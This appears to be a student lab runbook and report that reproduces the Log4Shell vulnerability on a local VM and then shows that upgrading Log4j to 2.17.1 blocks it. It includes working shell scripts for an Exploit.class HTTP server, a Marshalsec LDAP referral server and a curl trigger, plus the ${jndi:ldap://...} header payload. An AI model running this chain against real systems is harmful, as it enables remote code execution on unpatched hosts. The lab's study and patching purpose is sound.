# AIR-Project1-Task2
Proof of Concept Replication of the Incident

## PoC Execution Runbook



All commands below run as **`log4shell`**.

```bash
sudo su - log4shell
cd /opt/log4shell
```

---

## 1. HTTP server script (serves `Exploit.class` on :8000)

```bash
cat > /opt/log4shell/run-http-server.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

PAYLOAD_DIR="/opt/log4shell/CVE-2021-44228/exploit"
LOG_DIR="/opt/log4shell/logs"
mkdir -p "$LOG_DIR"

cd "$PAYLOAD_DIR"

if pgrep -f "python3 -m http.server 8000" >/dev/null 2>&1; then
  echo "[=] HTTP server already running on :8000"
  exit 0
fi

echo "[*] Starting Python HTTP server on :8000 serving $PAYLOAD_DIR ..."
nohup python3 -m http.server 8000 >"$LOG_DIR/http-server.log" 2>&1 &

echo "[*] Logs: $LOG_DIR/http-server.log"
EOF
```

---

## 2. LDAP server script (Marshalsec on :1389 → HTTP :8000/#Exploit)

```bash
cat > /opt/log4shell/run-ldap-server.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="/opt/log4shell"
LDAP_DIR="$LAB_DIR/CVE-2021-44228/ldap_server"
LOG_DIR="$LAB_DIR/logs"
mkdir -p "$LOG_DIR"

JAR="$(ls "$LDAP_DIR"/target/ldap_server-*-all.jar 2>/dev/null | head -n1)"

if [ -z "$JAR" ]; then
  echo "[-] ldap_server JAR not found in $LDAP_DIR/target." >&2
  echo "    Build it with: cd $LDAP_DIR && mvn clean package -DskipTests"
  exit 1
fi

if ss -tulpn 2>/dev/null | grep -q ':1389 '; then
  echo "[=] Something already listening on port 1389."
  exit 0
fi

HTTP_HOST="127.0.0.1"
HTTP_PORT="8000"

echo "[*] Starting LDAP server on :1389 (redirects to http://${HTTP_HOST}:${HTTP_PORT}/#Exploit) ..."
nohup java -cp "$JAR" marshalsec.jndi.LDAPRefServer "http://${HTTP_HOST}:${HTTP_PORT}/#Exploit" >"$LOG_DIR/ldap-server.log" 2>&1 &

echo "[*] Logs: $LOG_DIR/ldap-server.log"
EOF
```

---

## 3. Vulnerable app script (native Java on :8080 – **no Docker**)

```bash
cat > /opt/log4shell/run-vulnerable-app.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

APP_DIR="/opt/log4shell/log4shell-vulnerable-app"
LOG_FILE="/opt/log4shell/vulnerable-app-native.log"

if pgrep -f "log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar" >/dev/null 2>&1; then
  echo "[=] Vulnerable app already running."
  exit 0
fi

cd "$APP_DIR"

if ! ls build/libs/log4shell-vulnerable-app-*-SNAPSHOT.jar >/dev/null 2>&1; then
  echo "[*] Building vulnerable app JAR..."
  chmod +x gradlew
  ./gradlew clean build
fi

JAR="$(ls build/libs/log4shell-vulnerable-app-*-SNAPSHOT.jar | grep -v plain | head -n1)"

if [ -z "$JAR" ]; then
  echo "[-] Could not find built JAR in build/libs/" >&2
  exit 1
fi

echo "[*] Using JAR: $JAR"
echo "[*] Starting vulnerable app on port 8080 ..."
nohup java -jar "$JAR" >"$LOG_FILE" 2>&1 &

echo "[*] Logs: $LOG_FILE"
EOF
```

---

## 4. Trigger script (you supply the JNDI payload via env var)

```bash
cat > /opt/log4shell/trigger-exploit.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

TARGET_URL="${1:-http://127.0.0.1:8080/}"

if [ -z "${JNDI_PAYLOAD:-}" ]; then
  cat <<'EOM'
[!] Environment variable JNDI_PAYLOAD is not set.

Set it using the pattern documented in:
  - /opt/log4shell/CVE-2021-44228/README.md   (curl example)
  - InfoSec Writeups "Exploiting Log4Shell — How Log4J Applications Were Hacked"

Example (for THIS lab only, based on PoC):
  export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'

Then run:
  JNDI_PAYLOAD="$JNDI_PAYLOAD" /opt/log4shell/trigger-exploit.sh

This keeps the actual payload under your control for lab use only.
EOM
  exit 1
fi

echo "[*] Sending Log4Shell test payload to $TARGET_URL ..."
curl -s "$TARGET_URL" -H "X-Api-Version: $JNDI_PAYLOAD"
echo
EOF
```

---

## 5. Make scripts executable

```bash
chmod +x /opt/log4shell/*.sh
ls -l /opt/log4shell
```

You should now see:

* `run-http-server.sh`
* `run-ldap-server.sh`
* `run-vulnerable-app.sh`
* `trigger-exploit.sh`
* `CVE-2021-44228/`
* `log4shell-vulnerable-app/`

---

## 6. Run the full chain

Still as `log4shell`:

```bash
cd /opt/log4shell

# 1) HTTP server (Exploit.class on 8000)
./run-http-server.sh

# 2) LDAP server (1389, points to 8000/#Exploit)
./run-ldap-server.sh

# 3) Vulnerable app (native Java, 8080)
./run-vulnerable-app.sh
curl -s -D- http://127.0.0.1:8080/ | head   # sanity check

# 4) Set JNDI payload from PoC README
nano /opt/log4shell/CVE-2021-44228/README.md  # find their curl header example

export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'  # copy/adapt from README
./trigger-exploit.sh
```

After triggering, check:

```bash
# See what Exploit.java does:
nano /opt/log4shell/CVE-2021-44228/exploit/Exploit.java

# Then look for the marker (e.g. in /tmp)
ls -l /tmp

# And check app log:
tail -n 40 /opt/log4shell/vulnerable-app-native.log
```

---

### 1. Start attacker infrastructure

All commands run inside the **Ubuntu ARM VM** as user `log4shell`.

1. Change into the lab directory:

   ```bash
   sudo su - log4shell
   cd /opt/log4shell
   ```

2. Start the **HTTP payload server** (serves `Exploit.class` on port 8000):

   ```bash
   ./run-http-server.sh
   ```

   * Verifies:

     ```bash
     curl -I http://127.0.0.1:8000/Exploit.class
     tail -n 10 logs/http-server.log
     ```
   * Expected: `HTTP/1.0 200 OK` and a log entry like
     `127.0.0.1 "HEAD /Exploit.class HTTP/1.1" 200 -`.

3. Start the **LDAP / JNDI server** (Marshalsec, listening on port 1389):

   ```bash
   ./run-ldap-server.sh
   ```

   * Verifies:

     ```bash
     tail -n 10 logs/ldap-server.log
     ```
   * Expected:
     `Listening on 0.0.0.0:1389`

   The LDAP server is configured to return a reference to:

   ```text
   http://127.0.0.1:8000/Exploit.class
   ```

---

### 2. Start the vulnerable application (victim)

4. Start the **vulnerable Spring Boot application** using the native JAR (no Docker):

   ```bash
   ./run-vulnerable-app.sh
   ```

5. Verify that it is running on port 8080:

   ```bash
   curl -s -D- http://127.0.0.1:8080/ | head
   ```

   * Expected: HTTP response with `Hello, world!` in the body (status may be 200 or 400, both OK for the lab).

6. Check the application log to confirm startup:

   ```bash
   tail -n 20 /opt/log4shell/vulnerable-app-native.log
   ```

   * Expected: Spring Boot / Tomcat startup messages, and on first request a line like:

     ```text
     HelloWorld : Received a request for API version Reference Class Name: foo
     ```

---

### 3. Trigger the Log4Shell exploit

7. Set the **JNDI payload** (copied from the PoC README, adjusted to this lab):

   ```bash
   cd /opt/log4shell
   export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
   ```

8. Send the HTTP request with the malicious `X-Api-Version` header:

   ```bash
   ./trigger-exploit.sh
   ```

   * Expected console output:

     ```text
     [*] Sending Log4Shell test payload to http://127.0.0.1:8080/ ...
     Hello, world!
     ```

9. Confirm that the vulnerable application logged the header:

   ```bash
   tail -n 20 /opt/log4shell/vulnerable-app-native.log
   ```

   * Look for a log entry showing the `X-Api-Version` value being processed (either the raw `${jndi:...}` or the resolved “Reference Class Name” text).

---

### 4. Observe the attacker-side behaviour

10. Check the **LDAP server log**:

```bash
tail -n 20 /opt/log4shell/logs/ldap-server.log
```

* Expected:

  ```text
  Listening on 0.0.0.0:1389
  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
  ```

This shows that Log4j has performed a JNDI lookup to the attacker-controlled LDAP server, which responds with a reference to `Exploit.class` hosted on the HTTP server.

11. Check the **HTTP server log**:

```bash
tail -n 20 /opt/log4shell/logs/http-server.log
```

* You will see entries for **manual tests** (e.g. your `curl -I` request), but **no entries triggered by the JVM** after sending the JNDI payload.

This demonstrates that:

* The application *is* performing the LDAP lookup,
* But on **Java 11.0.28**, the JVM does **not** follow the remote `codebase` reference to fetch `Exploit.class`.

---

### 5. Payload behaviour and JDK hardening

12. Inspect the payload source:

```bash
nano /opt/log4shell/CVE-2021-44228/exploit/Exploit.java
```

* The important line is:

  ```java
  Runtime.getRuntime().exec(command);
  ```
* In older JDKs, once `Exploit.class` is loaded this would execute a system command (for example, to create a marker file or run `id`).

13. In this environment, verify that no payload effect is observed:

```bash
ls -l /tmp
```

* No new marker file appears after triggering the exploit.

14. **Interpretation (for the report)**:

* The PoC successfully demonstrates:

  * Injection of a JNDI lookup into Log4j via an HTTP header.
  * Outbound LDAP communication from the vulnerable application to attacker infrastructure.
  * LDAP responses that instruct the JVM to load `Exploit.class` from an attacker-controlled HTTP server.
* However, the application is running on **OpenJDK 11.0.28**, where remote JNDI `codebase` loading is disabled by default, so:

  * The JVM does **not** request `/Exploit.class` from the HTTP server.
  * `Exploit.class` is never loaded, and `Runtime.getRuntime().exec(...)` is not executed.

This is a good example of how **JDK-level mitigations reduce exploitability**, even when the underlying Log4j version (2.14.1) is still in the vulnerable range.

---

### 6. Shutdown

15. To cleanly stop the lab:

```bash
pkill -f "log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar" || true
pkill -f "python3 -m http.server 8000" || true
pkill -f "marshalsec.jndi.LDAPRefServer" || true
```

---


Moment to “flip the switch” and show **before/after** behaviour with a proper Log4j patch.

Below is a *drop-in runbook* you can follow on your current VM to:

1. Upgrade Log4j in `log4shell-vulnerable-app`
2. Rebuild & restart the app
3. Re-run the **same JNDI payload** and show that it no longer triggers LDAP / JNDI

---

## 1. Patch Log4j in the Gradle build

You already have the app checked out at:

```bash
/opt/log4shell/log4shell-vulnerable-app
```

Spring Boot is pulling Log4j 2.14.1 via `spring-boot-starter-log4j2:2.6.1`, which is vulnerable.
We’ll force **all Log4j artifacts** to a safe version like **2.17.1** (fixes Log4Shell and follow-up CVEs).

### Step 1.1 – Backup and edit `build.gradle`

```bash
cd /opt/log4shell/log4shell-vulnerable-app

# Backup original
cp build.gradle build.gradle.bak-before-log4j-patch

# Edit
nano build.gradle
```

Scroll to the bottom (or anywhere at top level, outside other blocks) and **add this block**:

```groovy
// Force all Log4j dependencies to a safe version (patch CVE-2021-44228 & friends)
configurations.all {
    resolutionStrategy.eachDependency { DependencyResolveDetails details ->
        if (details.requested.group == 'org.apache.logging.log4j') {
            details.useVersion '2.17.1'
            details.because 'Upgrade Log4j to >= 2.17.1 to mitigate Log4Shell'
        }
    }
}
```

Save & exit (`Ctrl+O`, `Enter`, `Ctrl+X`).

> This is the same Gradle approach shown in Log4j exploitation tutorials (forcing the Log4j group version via `resolutionStrategy`).

---

## 2. Rebuild the vulnerable app with the patched Log4j

Still in `/opt/log4shell/log4shell-vulnerable-app` as **user `log4shell`**:

```bash
./gradlew clean build
```

(This will regenerate `build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar`.)

### Optional: prove the new Log4j version inside the JAR

```bash
cd /opt/log4shell/log4shell-vulnerable-app

jar tf build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar \
  | grep 'log4j-core'
```

You want to see something like:

```text
BOOT-INF/lib/log4j-core-2.17.1.jar
```

That’s your **evidence screenshot** for “patched Log4j version”.

---

## 3. Restart the Java app with the patched JAR

First, stop any old instance:

```bash
# As log4shell or parallels
pkill -f 'log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar' || true
```

Then start the app again using your existing helper script (it already auto-picks the latest JAR):

```bash
cd /opt/log4shell
./run-vulnerable-app.sh
```

Sanity-check:

```bash
curl -s -D- http://127.0.0.1:8080/ | head
```

You should still get the “Hello, world!” response.

---

## 4. Re-run the **same Log4Shell payload**

You already have the attacker infra:

* HTTP payload server on `:8000`
* LDAP server on `:1389`

If they’re not running, restart them:

```bash
cd /opt/log4shell

./run-http-server.sh    # terminal 1
./run-ldap-server.sh    # terminal 2
./run-vulnerable-app.sh # terminal 3 (already done)
```

Now, in another shell (parallels or log4shell), set the payload and trigger:

```bash
cd /opt/log4shell
export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
./trigger-exploit.sh
```

You should still see:

```text
[*] Sending Log4Shell test payload to http://127.0.0.1:8080/ ...
Hello, world!
```

---

## 5. Compare logs **before vs after** patch

This is the “demonstration” part for your assignment.

### 5.1 LDAP server log (before patch: **activity**, after patch: **no new lines**)

Check LDAP log:

```bash
tail -n 20 /opt/log4shell/logs/ldap-server.log
```

* **Before patch** you saw lines like:

  ```text
  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
  ```
* **After patch to Log4j 2.17.1**, sending the **same payload** should **not** generate any *new* LDAP queries when you re-run the exploit.

If there are timestamps, you can clearly show: *“no LDAP requests at time T2 after patch”*.

---

### 5.2 HTTP server log (still only manual tests)

Check HTTP log:

```bash
tail -n 20 /opt/log4shell/logs/http-server.log
```

* You’ll still see entries for your **manual `curl`** like:

  ```text
  127.0.0.1 - - [...] "HEAD /Exploit.class HTTP/1.1" 200 -
  ```
* But when you trigger the exploit with patched Log4j, **no new GET/HEAD** from the app should appear.

This supports: *“JVM no longer attempts to fetch `Exploit.class` via Log4j JNDI lookups after patching”*.

---

### 5.3 Application log: payload now logged as plain text

Finally, check the Spring Boot app log:

```bash
tail -n 40 /opt/log4shell/vulnerable-app-native.log
```

Look for the line that logs the header. Before patch, Log4j was evaluating the `${jndi:...}` and you saw:

```text
HelloWorld : Received a request for API version Reference Class Name: foo
```

After upgrading to 2.17.x, Log4j has JNDI lookups disabled by default, so you should see one of these behaviours:

* The **literal string** `${jndi:ldap://127.0.0.1:1389/a}` in the log, or
* A benign message where the JNDI placeholder *does not* trigger any outbound LDAP.

This lines up with vendor guidance: **the main remediation is to upgrade Log4j to 2.17.1+**, which disables the dangerous JNDI lookups and fixes follow-up issues.

---

## 6. Describe this in your report / demo

Summarise the “patch & retest”:

1. **Initial state (vulnerable)**

   * `build.gradle` pulls `spring-boot-starter-log4j2:2.6.1`, which brings in `log4j-core:2.14.1`.
   * Sending `X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}` causes:

     * Log4j to perform a JNDI lookup.
     * Outbound LDAP requests to `127.0.0.1:1389` (seen in `ldap-server.log`).
     * LDAP replies referencing `http://127.0.0.1:8000/Exploit.class`.

2. **Patch**

   * Add a Gradle `resolutionStrategy` block to force all `org.apache.logging.log4j` artifacts to `2.17.1`.
   * Rebuild the application; the fat JAR now contains `log4j-core-2.17.1.jar`.

3. **Post-patch behaviour (same payload)**

   * The same HTTP request with `X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}`:

     * Returns “Hello, world!” to the client (app still works).
     * **Does not** generate new LDAP queries (no additional entries in `ldap-server.log`).
     * **Does not** fetch `/Exploit.class` from the HTTP server.
     * Logs the payload as plain text / without JNDI resolution.

4. **Conclusion**

   * This demonstrates that **upgrading Log4j** (rather than relying on JVM quirks or partial mitigations) effectively blocks the Log4Shell exploit path, even though the application logic and the incoming payload remain unchanged.

---

Report / lab notes that demonstrates patching Log4j and re-testing with the same payload.

---

### Patching Log4j and Re-Testing with the Same Payload

After successfully reproducing the Log4Shell exploitation chain against the vulnerable application, the next step was to apply a proper Log4j patch and verify that the same payload no longer produced any JNDI / LDAP activity.

#### 1. Upgrading Log4j in the vulnerable application

The sample application `log4shell-vulnerable-app` is a Spring Boot project that originally depended on Log4j 2.14.1 via `spring-boot-starter-log4j2:2.6.1`. To mitigate CVE-2021-44228, I forced all Log4j dependencies to version **2.17.1** using Gradle’s dependency resolution:

```groovy
// build.gradle – added at the bottom (top-level)
configurations.all {
    resolutionStrategy.eachDependency { DependencyResolveDetails details ->
        if (details.requested.group == 'org.apache.logging.log4j') {
            details.useVersion '2.17.1'
            details.because 'Upgrade Log4j to >= 2.17.1 to mitigate Log4Shell'
        }
    }
}
```

The application was then rebuilt:

```bash
cd /opt/log4shell/log4shell-vulnerable-app
cp build.gradle build.gradle.bak-before-log4j-patch
./gradlew clean build
```

To confirm the patch, I inspected the resulting fat JAR:

```bash
jar tf build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar | grep 'log4j-core'
```

Output:

```text
BOOT-INF/lib/log4j-core-2.17.1.jar
```

This shows that the application is now using **log4j-core-2.17.1** instead of the vulnerable 2.14.1.

#### 2. Restarting the application with the patched JAR

Any previously running instance was stopped and the app restarted with the new JAR:

```bash
pkill -f 'log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar' || true

cd /opt/log4shell
./run-vulnerable-app.sh
```

A quick smoke test confirmed the app was up on port 8080:

```bash
curl -s -D- http://127.0.0.1:8080/ | head
```

The application still returns an HTTP 400 with a JSON error body, which is expected for a missing header, indicating normal behaviour.

#### 3. Re-using the exact same attack infrastructure and payload

The attacker infrastructure (HTTP + LDAP) was left unchanged:

```bash
cd /opt/log4shell
./run-http-server.sh     # serves Exploit.class on :8000
./run-ldap-server.sh     # LDAP server on :1389
```

The **same JNDI payload** used in the vulnerable case was re-used:

```bash
export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
./trigger-exploit.sh
```

Client-side output:

```text
[*] Sending Log4Shell test payload to http://127.0.0.1:8080/ ...
Hello, world!
```

So from the attacker’s perspective, nothing changed: same URL, same header, same payload.

#### 4. Behaviour before vs after patch

The key difference is visible in the logs.

**Before patch (Log4j 2.14.1):**

* **LDAP server log** showed callbacks from the app:

  ```text
  Listening on 0.0.0.0:1389
  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
  ```

* **App log** showed the header being processed via Log4j:

  ```text
  HelloWorld : Received a request for API version Reference Class Name: foo
  ```

This demonstrated that Log4j was evaluating the `${jndi:…}` expression and performing an outbound LDAP lookup to attacker-controlled infrastructure.

**After patch (Log4j 2.17.1):**

* The **LDAP server log** after re-triggering the exploit contained only the initial startup line:

  ```text
  Listening on 0.0.0.0:1389
  ```

  No new “Send LDAP reference result…” entries were added when the payload was sent, indicating that the application no longer performed any LDAP lookup for the `${jndi:…}` string.

* The **HTTP server log** remained unchanged (no new requests for `Exploit.class`), confirming that the JVM never attempted to fetch the malicious class over HTTP.

* The **application log** now recorded the payload as a plain string, without triggering JNDI:

  ```text
  HelloWorld : Received a request for API version ${jndi:ldap://127.0.0.1:1389/a}
  ```

In other words:

| Aspect                  | Before patch (2.14.1)                                  | After patch (2.17.1)                               |
| ----------------------- | ------------------------------------------------------ | -------------------------------------------------- |
| Log4j JNDI evaluation   | `${jndi:…}` evaluated, outbound LDAP performed         | `${jndi:…}` logged as a literal string             |
| LDAP server log         | “Send LDAP reference result to http://…/Exploit.class” | Only “Listening on 0.0.0.0:1389”, no new callbacks |
| HTTP exploit server log | (in older JDKs, would see GET /Exploit.class)          | No requests from the app for `/Exploit.class`      |
| Payload execution       | Intended OS command via `Runtime.getRuntime().exec()`  | Not reached; `Exploit.class` never loaded/executed |

#### 5. Interpretation

This experiment shows a clear **before/after** effect of patching Log4j:

* With **Log4j 2.14.1**, the application accepted attacker-controlled JNDI expressions via an HTTP header, evaluated them, and contacted an attacker-controlled LDAP server.
* After upgrading to **Log4j 2.17.1**, the **same payload** is treated as plain text; no JNDI lookup occurs, no LDAP connection is made, and the malicious `Exploit.class` is never requested.

This demonstrates that:

1. **Vulnerability reproduction**: The original configuration allowed Log4Shell-style exploitation (inbound JNDI + outbound LDAP).
2. **Effective mitigation**: A straightforward library upgrade (forcing Log4j to 2.17.1) is sufficient to break the exploitation path completely, even though the application code and the attacker’s payload remain unchanged.

Cite these logs and steps directly as your **“Demonstrate patching of Log4j and re-testing with the same payload”** evidence for Task 2.
